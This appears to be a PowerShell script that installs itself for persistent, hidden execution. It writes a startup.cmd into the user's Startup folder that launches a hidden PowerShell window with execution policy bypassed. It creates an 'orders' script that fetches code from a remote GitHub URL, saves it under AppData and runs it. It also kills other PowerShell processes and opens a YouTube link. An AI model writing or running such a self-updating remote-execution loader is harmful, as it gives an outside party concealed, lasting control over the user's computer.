[string]$Version = 16
Write-Host "process script starting: $Pid"

### Test ###
#Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
#$cred = Get-Credential
#$pass = ConvertTo-SecureString '' -AsPlainText -Force
#$id=($env:UserName)
#$cred = New-Object System.Management.Automation.PSCredential($id,$pass)
#New-PSDrive -Name P -PSProvider FileSystem -Root "C:\" -Credential $cred
#\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #startup registy

### Kill all other ps process ###
Get-Process -Name "*PowerShell*" | ForEach-Object {
    if($_.Id -ne $Pid){
        Write-Host "process $_ killed"
        Stop-Process -Id $_.Id -Force
    }
}

### Create starup.cmd ###
[string]$path = $env:APPDATA
[string]$StartupCmdPath = "$path"+"\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"

if(test-path($StartupCmdPath)){
    Remove-Item -Path $StartupCmdPath
}
New-Item -ItemType File -Path $StartupCmdPath -Force

$path = $env:APPDATA #override
$OrderPath = "$path"+"\Test\$Version\orders.ps1"

$StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"' #invisible
#'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"' #visible

Add-Content $StartupCmdPath $StartupCode

### Create order ###
$OrderCode = '
#PowerShell.exe -windowstyle hidden {
	Write-Host "Process order starting: $Pid"
	$update = $false
	#while(!$update){
        $remote_script = $null
		$remote_script = Invoke-WebRequest -URI "https://raw.githubusercontent.com/k4d4m/obey/master/script.ps1" | Select -expand Content
		$remote_version = ($remote_script -split '+'''\n'''+')[0]
		$remote_version = $remote_version.substring(19)
		$Version = '+"$Version"+'
		Write-Host "current version = $Version"
		if($Version -ne  $remote_version){
			Write-Host "New version = $remote_version"
			$update = $true
			#break
		}
		else{
			#start-sleep -s 600
		}
	#}
	if($update){
		$path = $env:APPDATA
		$FolderName = "\Test\$remote_version\"
		$ScriptPath = "$path"+"$FolderName"+"script.ps1"
		if(test-path($ScriptPath)){
			Remove-Item -path $ScriptPath
		}
		New-Item -ItemType File -Path $ScriptPath -Force
		Add-Content $ScriptPath $remote_script
		if(test-path($ScriptPath)){
			Write-Host "invoking updated script"			
			powershell.exe -executionpolicy bypass -file "$ScriptPath"
			#C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file $ScriptPath
		}
	}
	Write-Host "order completed: $Pid"
	Stop-Process -Id $Pid -Force
#}
'
	
if(test-path($OrderPath)){
    Remove-Item -path $OrderPath
}
New-Item -ItemType File -Path $OrderPath -Force
Add-Content $OrderPath $OrderCode

### Do anything really ###
$IE=new-object -com internetexplorer.application
$IE.navigate2("https://youtu.be/xnKhsTXoKCI")
$IE.visible=$true

### Run order ###
	if(test-path($OrderPath)){
		Write-Host "invoking deployed order version = $Version"
		powershell.exe -executionpolicy bypass -file "$OrderPath"
		#C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file $OrderPath
	}

Write-Host "Script completed: $Pid."
#pause
Stop-Process -Id $Pid -Force
